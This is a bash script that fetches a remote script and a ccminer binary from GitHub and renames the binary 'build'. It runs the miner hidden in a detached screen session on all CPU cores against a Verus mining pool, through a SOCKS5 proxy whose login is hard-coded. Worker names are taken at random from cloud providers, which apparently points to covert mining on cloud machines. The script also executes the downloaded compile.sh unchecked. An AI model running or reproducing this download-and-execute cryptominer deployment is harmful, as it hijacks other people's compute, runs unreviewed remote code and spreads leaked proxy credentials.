#!/bin/bash
proxy="socks5://elu:bangke@51.15.242.51:1080"
array[0]="AZURE"
array[1]="AWS"
array[2]="DIGITALOCEAN"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
apt install screen -y
wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.worker-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
echo succes
